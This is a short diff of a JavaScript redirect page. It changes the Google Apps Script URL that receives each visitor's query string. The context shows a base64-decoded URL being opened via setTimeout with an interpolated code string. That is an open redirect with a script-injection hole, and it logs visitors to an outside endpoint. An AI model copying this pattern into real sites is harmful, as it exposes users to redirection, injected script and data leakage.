@@ -1,6 +1,5 @@
-
-const url='https://script.google.com/macros/s/AKfycbx0LeEMDEP2VqJFtFmAWqjKc3cbEtNlgoyr1Dtk2qlmsMIvQ4slKAEFOpV11Gh5Nvdj/exec'
-const makelog=async ()=>{ 
+const url='https://script.google.com/macros/s/AKfycbwivqaniKlduIKlvvjz75RZv_ZIQ5yMzMyGGn6uKQvDnkwuEGe41GYx0xgi7mwVFvQ/exec'
+const makelog= async ()=>{ 
    fetch(url+location.search,
         {
             method: 'GET',
@@ -19,3 +18,4 @@ window.onload=function (){
     let newurl=atob(decodeURI(encodedurl));
     window.setTimeout(`window.open("${newurl}","_top",{})`,750) 
 }
+
